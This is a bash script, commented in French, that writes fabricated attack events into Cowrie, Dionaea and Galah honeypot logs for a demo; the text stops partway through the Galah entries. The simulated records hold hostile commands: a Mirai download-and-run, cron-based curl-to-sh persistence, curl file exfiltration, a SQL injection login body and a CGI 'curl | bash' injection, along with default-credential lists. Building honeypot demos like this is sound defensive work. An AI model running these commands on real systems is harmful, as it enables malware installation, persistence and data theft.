#!/bin/bash
# ============================================================
# ForenHive — Demo Attack Injection Script (v2)
# Injecte des logs d'attaque réalistes dans Cowrie, Dionaea, Galah
# Plusieurs IPs publiques ET privées par honeypot
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# ══════════════════════════════════════════════════════════════
# IPs de démonstration — COWRIE (SSH/Telnet)
# ══════════════════════════════════════════════════════════════
# Publiques
COWRIE_PUB1="185.220.101.55"   # Tor exit node (Allemagne)
COWRIE_PUB2="194.165.16.76"   # Scanner Shodan (Pays-Bas)
COWRIE_PUB3="45.146.164.110"  # Botnet Mirai connu (Russie)

# Privées
COWRIE_PRIV1="192.168.1.100"  # Poste utilisateur réseau local
COWRIE_PRIV2="10.0.0.55"      # Serveur interne compromis
COWRIE_PRIV3="172.16.5.22"    # Machine du VLAN dev

# ══════════════════════════════════════════════════════════════
# IPs de démonstration — DIONAEA (SMB/SQL/HTTP/...)
# ══════════════════════════════════════════════════════════════
# Publiques
DIONAEA_PUB1="91.92.251.103"  # Scanner malveillant (Iran)
DIONAEA_PUB2="205.210.31.229" # EternalBlue scanner (USA)
DIONAEA_PUB3="80.82.77.33"    # Scanner Shodan (Pays-Bas)

# Privées
DIONAEA_PRIV1="10.10.0.200"   # Machine interne infectée
DIONAEA_PRIV2="192.168.0.15"  # Poste IT compromis
DIONAEA_PRIV3="172.16.1.50"   # Serveur de fichiers interne

# ══════════════════════════════════════════════════════════════
# IPs de démonstration — GALAH (HTTP LLM Honeypot)
# ══════════════════════════════════════════════════════════════
# Publiques
GALAH_PUB1="45.142.212.100"   # Scanner HTTP Nuclei (Pays-Bas)
GALAH_PUB2="89.248.167.131"   # Scanner vulnérabilités (Pays-Bas)
GALAH_PUB3="198.199.70.24"    # DigitalOcean VPS / attaquant (USA)

# Privées
GALAH_PRIV1="172.20.0.10"     # Container interne Docker
GALAH_PRIV2="192.168.1.77"    # Poste développeur réseau local
GALAH_PRIV3="10.0.1.100"      # Serveur CI/CD interne

# ── Timestamps ────────────────────────────────────────────────
NOW=$(date -u +"%Y-%m-%dT%H:%M:%S.%fZ")

echo ""
echo -e "${BOLD}${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${BLUE}║      ForenHive — Injection de Logs d'Attaque Demo v2         ║${NC}"
echo -e "${BOLD}${BLUE}║      3 IPs publiques + 3 IPs privées par honeypot            ║${NC}"
echo -e "${BOLD}${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ════════════════════════════════════════════════════════════════
# ÉTAPE 1 — COWRIE (SSH/Telnet Honeypot)
# ════════════════════════════════════════════════════════════════
echo -e "${YELLOW}[1/3] Injection Cowrie (SSH Honeypot)...${NC}"
echo -e "      IPs Publiques : ${CYAN}${COWRIE_PUB1}${NC} | ${CYAN}${COWRIE_PUB2}${NC} | ${CYAN}${COWRIE_PUB3}${NC}"
echo -e "      IPs Privées   : ${MAGENTA}${COWRIE_PRIV1}${NC} | ${MAGENTA}${COWRIE_PRIV2}${NC} | ${MAGENTA}${COWRIE_PRIV3}${NC}"

docker exec -i forenhive-cowrie python3 - <<'PYEOF'
import json, uuid, time
from datetime import datetime, timezone, timedelta

log_path = '/cowrie/cowrie-git/var/log/cowrie/cowrie.json'

def ts(offset_sec=0):
    t = datetime.now(timezone.utc) + timedelta(seconds=offset_sec)
    return t.strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'

def sid():
    return uuid.uuid4().hex[:12]

sensor = 'forenhive-cowrie'
events = []

# ─────────────────────────────────────────────────────────────
# IP PUBLIQUE 1 : 185.220.101.55 — Tor exit node
# Scénario : brute force massif + téléchargement payload Mirai
# ─────────────────────────────────────────────────────────────
s = sid()
for i, (user, pwd) in enumerate([
    ("root","123456"), ("root","password"), ("root","admin"),
    ("admin","admin"), ("admin","1234"), ("root","toor"),
    ("ubuntu","ubuntu"), ("support","support"), ("test","test"),
    ("oracle","oracle"), ("guest","guest"), ("user","user"),
]):
    events.append({"eventid":"cowrie.login.failed","src_ip":"185.220.101.55",
        "src_port":58421,"session":s,"protocol":"ssh",
        "username":user,"password":pwd,
        "message":f"login attempt [{user}/{pwd}] failed",
        "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(i)})

events += [
    {"eventid":"cowrie.session.connect","src_ip":"185.220.101.55","src_port":58421,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s,"protocol":"ssh",
     "message":"New connection","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(0)},
    {"eventid":"cowrie.login.success","src_ip":"185.220.101.55","src_port":58421,
     "session":s,"protocol":"ssh","username":"root","password":"toor",
     "message":"login attempt [root/toor] succeeded",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(13)},
    {"eventid":"cowrie.command.input","src_ip":"185.220.101.55","src_port":58421,
     "session":s,"protocol":"ssh","input":"uname -a",
     "message":"CMD: uname -a","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(14)},
    {"eventid":"cowrie.command.input","src_ip":"185.220.101.55","src_port":58421,
     "session":s,"protocol":"ssh","input":"cat /proc/cpuinfo | grep model",
     "message":"CMD: cat /proc/cpuinfo","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(15)},
    {"eventid":"cowrie.command.input","src_ip":"185.220.101.55","src_port":58421,
     "session":s,"protocol":"ssh",
     "input":"wget http://185.220.101.55/mirai.arm7 -O /tmp/m && chmod +x /tmp/m && /tmp/m",
     "message":"CMD: wget mirai","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(16)},
    {"eventid":"cowrie.session.file_download","src_ip":"185.220.101.55","src_port":58421,
     "session":s,"protocol":"ssh",
     "url":"http://185.220.101.55/mirai.arm7",
     "outfile":"/tmp/m","shasum":"1bb736b97b5bcb4c5b3adf5c3c903fa3",
     "message":"Downloaded URL","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(17)},
    {"eventid":"cowrie.session.closed","src_ip":"185.220.101.55","src_port":58421,
     "session":s,"duration":32.7,
     "message":"Connection lost","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(33)},
]

# ─────────────────────────────────────────────────────────────
# IP PUBLIQUE 2 : 194.165.16.76 — Scanner automatique Shodan
# Scénario : scan léger, quelques tentatives, aucune commande
# ─────────────────────────────────────────────────────────────
s = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"194.165.16.76","src_port":41233,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s,"protocol":"ssh",
     "message":"New connection","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(40)},
    {"eventid":"cowrie.login.failed","src_ip":"194.165.16.76","src_port":41233,
     "session":s,"username":"root","password":"root",
     "message":"login attempt [root/root] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(41)},
    {"eventid":"cowrie.login.failed","src_ip":"194.165.16.76","src_port":41233,
     "session":s,"username":"admin","password":"password123",
     "message":"login attempt [admin/password123] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(42)},
    {"eventid":"cowrie.session.closed","src_ip":"194.165.16.76","src_port":41233,
     "session":s,"duration":3.1,
     "message":"Connection lost","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(43)},
]

# ─────────────────────────────────────────────────────────────
# IP PUBLIQUE 3 : 45.146.164.110 — Botnet Mirai / Telnet scan
# Scénario : attaque Telnet, credential stuffing IoT
# ─────────────────────────────────────────────────────────────
s = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"45.146.164.110","src_port":55901,
     "dst_ip":"172.16.1.100","dst_port":2223,"session":s,"protocol":"telnet",
     "message":"New connection Telnet","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(50)},
    {"eventid":"cowrie.login.failed","src_ip":"45.146.164.110","src_port":55901,
     "session":s,"protocol":"telnet","username":"admin","password":"admin",
     "message":"login attempt [admin/admin] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(51)},
    {"eventid":"cowrie.login.failed","src_ip":"45.146.164.110","src_port":55901,
     "session":s,"protocol":"telnet","username":"root","password":"vizxv",
     "message":"login attempt [root/vizxv] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(52)},
    {"eventid":"cowrie.login.success","src_ip":"45.146.164.110","src_port":55901,
     "session":s,"protocol":"telnet","username":"root","password":"default",
     "message":"login attempt [root/default] succeeded",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(53)},
    {"eventid":"cowrie.command.input","src_ip":"45.146.164.110","src_port":55901,
     "session":s,"protocol":"telnet","input":"sh",
     "message":"CMD: sh","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(54)},
    {"eventid":"cowrie.command.input","src_ip":"45.146.164.110","src_port":55901,
     "session":s,"protocol":"telnet",
     "input":"/bin/busybox MIRAI; cat /bin/busybox > /tmp/.m; chmod 777 /tmp/.m; /tmp/.m",
     "message":"CMD: mirai busybox","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(55)},
    {"eventid":"cowrie.session.closed","src_ip":"45.146.164.110","src_port":55901,
     "session":s,"duration":7.2,
     "message":"Connection lost","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(58)},
]

# ─────────────────────────────────────────────────────────────
# IP PRIVÉE 1 : 192.168.1.100 — Poste utilisateur réseau local
# Scénario : quelques tentatives ratées, menace interne faible
# ─────────────────────────────────────────────────────────────
s = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"192.168.1.100","src_port":34902,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s,"protocol":"ssh",
     "message":"New connection","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(70)},
    {"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","src_port":34902,
     "session":s,"username":"ubuntu","password":"ubuntu",
     "message":"login attempt [ubuntu/ubuntu] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(71)},
    {"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","src_port":34902,
     "session":s,"username":"pi","password":"raspberry",
     "message":"login attempt [pi/raspberry] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(72)},
    {"eventid":"cowrie.session.closed","src_ip":"192.168.1.100","src_port":34902,
     "session":s,"duration":2.5,
     "message":"Connection lost","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(73)},
]

# ─────────────────────────────────────────────────────────────
# IP PRIVÉE 2 : 10.0.0.55 — Serveur interne compromis (latéral)
# Scénario : mouvement latéral post-compromission, cmds actives
# ─────────────────────────────────────────────────────────────
s = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"10.0.0.55","src_port":48811,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s,"protocol":"ssh",
     "message":"New connection","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(80)},
    {"eventid":"cowrie.login.success","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"username":"root","password":"P@ssw0rd!",
     "message":"login attempt [root/P@ssw0rd!] succeeded",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(81)},
    {"eventid":"cowrie.command.input","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"input":"id && whoami && hostname",
     "message":"CMD: id","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(82)},
    {"eventid":"cowrie.command.input","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"input":"cat /etc/passwd | grep -v nologin",
     "message":"CMD: cat /etc/passwd","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(83)},
    {"eventid":"cowrie.command.input","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"input":"ss -tlnp && netstat -an",
     "message":"CMD: ss -tlnp","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(84)},
    {"eventid":"cowrie.command.input","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"input":"crontab -l ; echo '*/5 * * * * curl http://10.0.0.55/beacon.sh | sh' >> /var/spool/cron/root",
     "message":"CMD: crontab persistence","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(85)},
    {"eventid":"cowrie.command.input","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"input":"tar -czf /tmp/data.tgz /var/www/html/uploads && curl -F 'f=@/tmp/data.tgz' http://10.0.0.55/exfil",
     "message":"CMD: exfiltration","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(87)},
    {"eventid":"cowrie.session.closed","src_ip":"10.0.0.55","src_port":48811,
     "session":s,"duration":45.0,
     "message":"Connection lost","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(125)},
]

# ─────────────────────────────────────────────────────────────
# IP PRIVÉE 3 : 172.16.5.22 — Machine VLAN dev
# Scénario : curiosité / test d'un dev, peu d'activité
# ─────────────────────────────────────────────────────────────
s = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"172.16.5.22","src_port":52200,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s,"protocol":"ssh",
     "message":"New connection","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(130)},
    {"eventid":"cowrie.login.failed","src_ip":"172.16.5.22","src_port":52200,
     "session":s,"username":"deploy","password":"deploy",
     "message":"login attempt [deploy/deploy] failed",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(131)},
    {"eventid":"cowrie.session.closed","src_ip":"172.16.5.22","src_port":52200,
     "session":s,"duration":1.1,
     "message":"Connection lost","sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(132)},
]

with open(log_path, 'a') as f:
    for e in events:
        f.write(json.dumps(e) + '\n')

print(f'  Injecté {len(events)} événements Cowrie dans {log_path}')
PYEOF

echo -e "  ${GREEN}✓ Cowrie — 3 IPs publiques + 3 IPs privées (${#} events total)${NC}"
echo -e "    ${CYAN}PUB1${NC} 185.220.101.55  → brute force massif (12 tentatives) + téléchargement Mirai"
echo -e "    ${CYAN}PUB2${NC} 194.165.16.76   → scan léger automatique (2 tentatives)"
echo -e "    ${CYAN}PUB3${NC} 45.146.164.110  → attaque Telnet botnet IoT"
echo -e "    ${MAGENTA}PRIV1${NC} 192.168.1.100 → quelques tentatives échouées"
echo -e "    ${MAGENTA}PRIV2${NC} 10.0.0.55     → mouvement latéral + exfiltration (DANGEREUX)"
echo -e "    ${MAGENTA}PRIV3${NC} 172.16.5.22   → 1 tentative, probablement dev"
echo ""

# ════════════════════════════════════════════════════════════════
# ÉTAPE 2 — DIONAEA (Multi-protocole Honeypot)
# ════════════════════════════════════════════════════════════════
echo -e "${YELLOW}[2/3] Injection Dionaea (SMB/SQL/HTTP/FTP Honeypot)...${NC}"
echo -e "      IPs Publiques : ${CYAN}${DIONAEA_PUB1}${NC} | ${CYAN}${DIONAEA_PUB2}${NC} | ${CYAN}${DIONAEA_PUB3}${NC}"
echo -e "      IPs Privées   : ${MAGENTA}${DIONAEA_PRIV1}${NC} | ${MAGENTA}${DIONAEA_PRIV2}${NC} | ${MAGENTA}${DIONAEA_PRIV3}${NC}"

docker exec forenhive-dionaea sh -c "
cat >> /opt/dionaea/var/log/dionaea/dionaea.log << 'EOF'

# ── IP PUBLIQUE 1 : 91.92.251.103 — Scanner Iran (SMB + SQL + HTTP)
connection accepted from 91.92.251.103:49832 to 172.16.1.100:445
connection accepted from 91.92.251.103:49833 to 172.16.1.100:445
connection accepted from 91.92.251.103:52144 to 172.16.1.100:1433
connection accepted from 91.92.251.103:52145 to 172.16.1.100:3306
connection accepted from 91.92.251.103:52200 to 172.16.1.100:80
connection accepted from 91.92.251.103:52201 to 172.16.1.100:443

# ── IP PUBLIQUE 2 : 205.210.31.229 — EternalBlue scanner USA (SMB intensif)
connection accepted from 205.210.31.229:60001 to 172.16.1.100:445
connection accepted from 205.210.31.229:60002 to 172.16.1.100:445
connection accepted from 205.210.31.229:60003 to 172.16.1.100:445
connection accepted from 205.210.31.229:60004 to 172.16.1.100:445
connection accepted from 205.210.31.229:60010 to 172.16.1.100:135
connection accepted from 205.210.31.229:60011 to 172.16.1.100:1433

# ── IP PUBLIQUE 3 : 80.82.77.33 — Shodan scanner Pays-Bas (multi-port)
connection accepted from 80.82.77.33:33001 to 172.16.1.100:23
connection accepted from 80.82.77.33:33002 to 172.16.1.100:80
connection accepted from 80.82.77.33:33003 to 172.16.1.100:1723
connection accepted from 80.82.77.33:33004 to 172.16.1.100:1883
connection accepted from 80.82.77.33:33005 to 172.16.1.100:27017
connection accepted from 80.82.77.33:33006 to 172.16.1.100:11211

# ── IP PRIVÉE 1 : 10.10.0.200 — Machine interne infectée (SMB latéral)
connection accepted from 10.10.0.200:61001 to 172.16.1.100:445
connection accepted from 10.10.0.200:61002 to 172.16.1.100:445
connection accepted from 10.10.0.200:61100 to 172.16.1.100:1433

# ── IP PRIVÉE 2 : 192.168.0.15 — Poste IT (accès SQL interne suspect)
connection accepted from 192.168.0.15:44500 to 172.16.1.100:3306
connection accepted from 192.168.0.15:44501 to 172.16.1.100:5432
connection accepted from 192.168.0.15:44502 to 172.16.1.100:27017

# ── IP PRIVÉE 3 : 172.16.1.50 — Serveur de fichiers (SMB vers honeypot)
connection accepted from 172.16.1.50:55001 to 172.16.1.100:445
connection accepted from 172.16.1.50:55002 to 172.16.1.100:445
EOF
echo 'OK: logs Dionaea injectés'
"

echo -e "  ${GREEN}✓ Dionaea — 3 IPs publiques + 3 IPs privées${NC}"
echo -e "    ${CYAN}PUB1${NC} 91.92.251.103   → SMB + MSSQL + MySQL + HTTP/HTTPS (6 connexions)"
echo -e "    ${CYAN}PUB2${NC} 205.210.31.229  → SMB intensif x4 + RPC 135 + MSSQL (EternalBlue)"
echo -e "    ${CYAN}PUB3${NC} 80.82.77.33     → scan multi-port (Telnet/HTTP/PPTP/MQTT/MongoDB/Memcached)"
echo -e "    ${MAGENTA}PRIV1${NC} 10.10.0.200   → SMB latéral x2 + MSSQL interne"
echo -e "    ${MAGENTA}PRIV2${NC} 192.168.0.15  → MySQL + PostgreSQL + MongoDB (exfil DB?)"
echo -e "    ${MAGENTA}PRIV3${NC} 172.16.1.50   → SMB x2 depuis serveur fichiers"
echo ""

# ════════════════════════════════════════════════════════════════
# ÉTAPE 3 — GALAH (HTTP LLM Honeypot)
# ════════════════════════════════════════════════════════════════
echo -e "${YELLOW}[3/3] Injection Galah (HTTP/LLM Honeypot)...${NC}"
echo -e "      IPs Publiques : ${CYAN}${GALAH_PUB1}${NC} | ${CYAN}${GALAH_PUB2}${NC} | ${CYAN}${GALAH_PUB3}${NC}"
echo -e "      IPs Privées   : ${MAGENTA}${GALAH_PRIV1}${NC} | ${MAGENTA}${GALAH_PRIV2}${NC} | ${MAGENTA}${GALAH_PRIV3}${NC}"

# Générer les timestamps avec décalage
_ts() { date -u -d "+${1} seconds" +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+$((10000+${1})).000000000" 2>/dev/null || date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+$((10000+${1})).000000000"; }

T1=$(_ts 0)
T2=$(_ts 2)
T3=$(_ts 4)
T4=$(_ts 6)
T5=$(_ts 8)
T6=$(_ts 10)
T7=$(_ts 12)
T8=$(_ts 14)
T9=$(_ts 16)
T10=$(_ts 18)
T11=$(_ts 20)
T12=$(_ts 22)

docker exec forenhive-galah sh -c "
cat >> /app/logs/event_log.json << 'EOF'
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"Nuclei - Open-source project\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h01\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/wp-admin/\",\"sessionID\":\"pub1_s01\",\"userAgent\":\"Nuclei - Open-source project\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html; charset=UTF-8\",\"Server\":\"Apache/2.4.29 (Ubuntu)\"},\"body\":\"<html><title>WP Admin</title></html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T1}\",\"srcIP\":\"45.142.212.100\",\"srcHost\":\"\",\"srcPort\":\"52301\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"Nuclei - Open-source project\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h02\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/phpmyadmin/\",\"sessionID\":\"pub1_s01\",\"userAgent\":\"Nuclei - Open-source project\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"nginx/1.18.0\"},\"body\":\"<html><title>phpMyAdmin</title></html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T2}\",\"srcIP\":\"45.142.212.100\",\"srcHost\":\"\",\"srcPort\":\"52302\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"username=admin'+OR+'1'%3D'1&password=x\",\"bodySha256\":\"h03\",\"headers\":{\"User-Agent\":\"sqlmap/1.7\",\"Content-Type\":\"application/x-www-form-urlencoded\"},\"headersSorted\":\"Content-Type,User-Agent\",\"headersSortedSha256\":\"h04\",\"method\":\"POST\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/login.php\",\"sessionID\":\"pub1_s02\",\"userAgent\":\"sqlmap/1.7\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"Apache/2.4.29\"},\"body\":\"<html>Welcome admin!</html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T3}\",\"srcIP\":\"45.142.212.100\",\"srcHost\":\"\",\"srcPort\":\"52303\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"Zgrab/0.x\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h05\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/\",\"sessionID\":\"pub2_s01\",\"userAgent\":\"Zgrab/0.x\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"Apache/2.4.41\"},\"body\":\"<html><body>Apache Default</body></html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T4}\",\"srcIP\":\"89.248.167.131\",\"srcHost\":\"\",\"srcPort\":\"61001\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"Zgrab/0.x\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h06\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/config.php.bak\",\"sessionID\":\"pub2_s01\",\"userAgent\":\"Zgrab/0.x\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/plain\",\"Server\":\"Apache/2.4.41\"},\"body\":\"DB_PASS=admin123\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T5}\",\"srcIP\":\"89.248.167.131\",\"srcHost\":\"\",\"srcPort\":\"61002\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8888\",\"httpRequest\":{\"body\":\"cmd=id\",\"bodySha256\":\"h07\",\"headers\":{\"User-Agent\":\"python-requests/2.28\",\"Content-Type\":\"application/x-www-form-urlencoded\"},\"headersSorted\":\"Content-Type,User-Agent\",\"headersSortedSha256\":\"h08\",\"method\":\"POST\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/cgi-bin/admin.cgi\",\"sessionID\":\"pub3_s01\",\"userAgent\":\"python-requests/2.28\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"nginx/1.14.0\"},\"body\":\"uid=0(root) gid=0(root)\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T6}\",\"srcIP\":\"198.199.70.24\",\"srcHost\":\"\",\"srcPort\":\"44501\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8888\",\"httpRequest\":{\"body\":\"cmd=curl http://198.199.70.24/drop.sh | bash\",\"bodySha256\":\"h09\",\"headers\":{\"User-Agent\":\"python-requests/2.28\",\"Content-Type\":\"application/x-www-form-urlencoded\"},\"headersSorted\":\"Content-Type,User-Agent\",\"headersSortedSha256\":\"h10\",\"method\":\"POST\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/cgi-bin/admin.cgi\",\"sessionID\":\"pub3_s01\",\"userAgent\":\"python-requests/2.28\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"nginx/1.14.0\"},\"body\":\"OK\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T7}\",\"srcIP\":\"198.199.70.24\",\"srcHost\":\"\",\"srcPort\":\"44502\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"Mozilla/5.0\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h11\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/api/v1/users\",\"sessionID\":\"priv1_s01\",\"userAgent\":\"Mozilla/5.0\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"application/json\",\"Server\":\"Apache/2.4.29\"},\"body\":\"{\\\"users\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"admin\\\"}]}\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T8}\",\"srcIP\":\"172.20.0.10\",\"srcHost\":\"\",\"srcPort\":\"43201\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"Mozilla/5.0\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h12\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/.env\",\"sessionID\":\"priv1_s02\",\"userAgent\":\"Mozilla/5.0\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/plain\",\"Server\":\"Apache/2.4.29\"},\"body\":\"DB_PASSWORD=secret123\\nAPI_KEY=sk-prod-xxxxx\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T9}\",\"srcIP\":\"172.20.0.10\",\"srcHost\":\"\",\"srcPort\":\"43202\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44\",\"headers\":{\"User-Agent\":\"curl/7.68.0\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"h13\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/admin/backup.zip\",\"sessionID\":\"priv2_s01\",\"userAgent\":\"curl/7.68.0\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"application/zip\",\"Server\":\"nginx/1.18.0\"},\"body\":\"PK....\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${T10}\",\"srcIP\":\"192.168.1.77\",\"srcHost\":\"\",\"srcPort\":\"55001\",\"tags\":null}
